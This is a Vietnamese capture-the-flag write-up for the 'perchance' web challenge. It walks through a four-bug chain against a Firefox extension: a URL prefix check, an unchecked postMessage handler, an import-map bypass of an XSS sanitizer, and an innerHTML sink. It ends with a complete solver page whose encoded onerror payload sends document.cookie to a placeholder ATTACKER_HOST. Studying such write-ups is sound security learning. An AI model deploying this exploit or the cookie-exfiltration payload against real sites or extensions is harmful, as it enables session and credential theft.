---
title: perchance
date: 2026-09-27
ctf: NNS CTF
category: web
difficulty: hard
tags:
  - Client-Side
  - XSS
  - Browser Extension
  - postMessage
  - Import Map
---

## Đề bài 
perchance

File: [web_perchance.tar.gz](https://github.com/Drakie14/Challenges/blob/NNS-CTF/web_perchance.tar.gz)
>Hint: `doc.rust-lang.org` itself is out of scope!

## Solution
Đây là challenge **client-side / browser-extension XSS**. Bot (Playwright + Firefox) mang sẵn cookie `flag` gắn với `doc.rust-lang.org` (path `/stable/std/`, **không** `httpOnly`). Ta phải chạy JS trong ngữ cảnh `doc.rust-lang.org` để đọc `document.cookie` rồi exfil. Chuỗi khai thác ghép **4 bug**.

### Bug 1 — Domain-prefix confusion (server)

```ts!
if (!url || !url.startsWith('https://doc.rust-lang.org')) {   // (!) thiếu dấu '/'
  return Response.json({ ok: false, error: 'Bad url' }, { status: 400 });
}
await runBrowser(url);
```

Thiếu `/` cuối nên `https://doc.rust-lang.org.<attacker>/` vẫn qua -> ép bot mở thẳng **trang attacker**, ta có full JS. (Hint đề: `doc.rust-lang.org` itself is out of scope -> phải dùng subdomain kiểu này.)

### Bug 2 — Điều khiển `activateOn` (options.js postMessage)

`web_accessible_resources: ["*"]` + UUID cố định -> nhúng được `moz-extension://<uuid>/options.html`. `options.js` **không kiểm tra `e.origin`**, chỉ cần chuỗi *chứa* `https://doc.rust-lang.org/`, rồi lưu **`u.origin`** làm `activateOn`:

```js!
window.addEventListener('message', (e) => {         // không check origin
  if (e.data.match(/^https?/)) updateConfig(e.data);
});
// updateConfig: if (!u.href.includes('https://doc.rust-lang.org/')) return;
//               browser.storage.local.set({ activateOn: u.origin });
```

- Gửi `"<OUR_ORIGIN>/https://doc.rust-lang.org/"` -> `activateOn = OUR_ORIGIN` (tiêm `cs.js` vào trang attacker).
- Gửi `"https://doc.rust-lang.org/"` -> reset để tiêm `cs.js` vào trang docs thật.

### Bug 3 — Bypass js-xss bằng import map (ghi `previous` thô)

`cs.js` lưu `previous = window[nonce](location.href)`, với `window[nonce]` là default export của `http://localhost:3000/jsxss.js` (đáng lẽ là `filterXSS`). `nonce` ngẫu nhiên nhưng **specifier import là URL tuyệt đối cố định** -> đặt sẵn **import map** trong top frame để remap:

```html!
<script type="importmap">
{ "imports": { "http://localhost:3000/jsxss.js":
    "data:text/javascript,export default ()=> \"<img src=x onerror=EXFIL>\"" } }
</script>
```

-> `default` không còn là `filterXSS` mà là hàm trả HTML thô -> `previous` chứa payload chưa qua sanitizer (background `updateLastUrl` cũng không check `sender`).

### Bug 4 — innerHTML sink -> XSS trên `doc.rust-lang.org`

Khi `cs.js` chạy trên trang docs thật:

```js!
elm.innerHTML = 'Previous: ' + previous;   // (!) SINK
```

`<img onerror>` do content script tạo là node DOM thật của trang -> inline handler **chạy trong world của `doc.rust-lang.org`**. Trang ở `/stable/std/` nên `document.cookie` chứa cookie `flag` (non-httpOnly) -> đọc và exfil về server attacker.

### Luồng hoàn chỉnh

```!
POST /perchance  perchance=https://doc.rust-lang.org.<attacker>/         (Bug 1)
 └─ bot mở trang attacker
     1) iframe options.html + postMessage -> activateOn = OUR_ORIGIN     (Bug 2)
     2) iframe khớp URL -> onCompleted -> cs.js tiêm vào top frame
          import module đã remap -> previous = "<img onerror=exfil>" thô (Bug 3)
     3) postMessage -> activateOn = "https://doc.rust-lang.org"          (Bug 2)
     4) location = https://doc.rust-lang.org/stable/std/index.html
          -> cs.js -> innerHTML previous -> onerror chạy trong world     (Bug 4)
             doc.rust-lang.org -> đọc cookie flag -> gửi về attacker
```

Trang khai thác (sửa `ATTACKER_HOST` thành webhook của bạn, host tại domain dạng `doc.rust-lang.org.<something>` qua HTTPS, rồi submit URL đó vào `/perchance`; cookie `flag` về webhook sau ~40s):

```html!
<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<title>perchance solver</title>
<!--
  Import map PHẢI có trong top document TRƯỚC khi bất kỳ module script nào chạy.
  Content script (cs.js) của extension sau đó tiêm vào top frame này một
  `<script type="module">import x from 'http://localhost:3000/jsxss.js'`.
  Import map remap specifier đó sang module của ta: default export KHÔNG phải
  filterXSS() thật mà là hàm trả HTML thô (chưa sanitize). cs.js lưu payload thô
  đó vào `previous`, bypass hoàn toàn js-xss.

  Thay ATTACKER_HOST bên dưới (trong data: URL) bằng webhook host của bạn.
-->
<script type="importmap">
{
  "imports": {
    "http://localhost:3000/jsxss.js": "data:text/javascript,export%20default%20%28%29%3D%3E%22%3Cimg%20src%3Dx%20onerror%3D%5C%22location%3D%27https%3A%2F%2FATTACKER_HOST%2Fexfil%3Fc%3D%27%2BencodeURIComponent%28document.cookie%29%5C%22%3E%22%3B"
  }
}
</script>
</head>
<body>
<h1>perchance</h1>
<script>
// UUID cố định mà challenge pin extension vào (browser.ts firefoxUserPrefs).
const EXT = '09a6c422-a354-447d-b4ea-185cb10be869';
// options.html là web_accessible_resources: ["*"], nên trang nào cũng frame được.
const OPT = `moz-extension://${EXT}/options.html`;

// Trang này được host tại https://doc.rust-lang.org.<attacker>/ .
// Qua được check phía server  url.startsWith('https://doc.rust-lang.org')
// (thiếu dấu / cuối => domain-prefix confusion kinh điển).
const OUR_ORIGIN = location.origin;   // vd https://doc.rust-lang.org.attacker.tld

// Frame options.html rồi postMessage một URL. options.js -> updateConfig() set
// storage.local.activateOn = new URL(msg).origin, miễn chuỗi chứa
// 'https://doc.rust-lang.org/'. Nhờ vậy trỏ trigger tiêm của extension vào
// BẤT KỲ origin nào ta muốn.
function setActivateOn(newUrl) {
  const f = document.createElement('iframe');
  f.style.display = 'none';
  f.src = OPT;
  f.onload = () => f.contentWindow.postMessage(newUrl, '*');
  document.body.appendChild(f);
}

// STEP 1 -- trỏ activateOn về origin CỦA TA để cs.js chạy trên trang này.
//           u.origin của chuỗi dưới == OUR_ORIGIN, và chứa substring bắt buộc.
setActivateOn(OUR_ORIGIN + '/https://doc.rust-lang.org/');

// STEP 2 -- tạo một document load có URL khớp (startsWith activateOn &&
//           includes 'https://doc.rust-lang.org/'). webNavigation.onCompleted
//           bắn -> extension tiêm cs.js vào TOP frame (chính ta). cs.js import
//           module đã remap, window[nonce] thành hàm của ta; nó được gọi với
//           location.href, giá trị trả THÔ được lưu vào `previous` qua message
//           updateLastUrl (không check sender).
setTimeout(() => {
  const t = document.createElement('iframe');
  t.style.display = 'none';
  t.src = OUR_ORIGIN + '/trigger#https://doc.rust-lang.org/';
  document.body.appendChild(t);
}, 3000);

// STEP 3 -- reset activateOn về origin docs thật để extension tiêm cs.js lần
//           nữa khi ta landing trên doc.rust-lang.org thật.
setTimeout(() => setActivateOn('https://doc.rust-lang.org/'), 8000);

// STEP 4 -- điều hướng top frame sang trang /stable/std/ thật (path của cookie).
//           cs.js chạy  elm.innerHTML = 'Previous: ' + previous , <img onerror>
//           của ta bắn trong world của trang, đọc cookie `flag` (non-httpOnly)
//           và exfil.
setTimeout(() => { location = 'https://doc.rust-lang.org/stable/std/index.html'; }, 12000);
</script>
</body>
</html>
```

-> Flag: `NNS{...}`
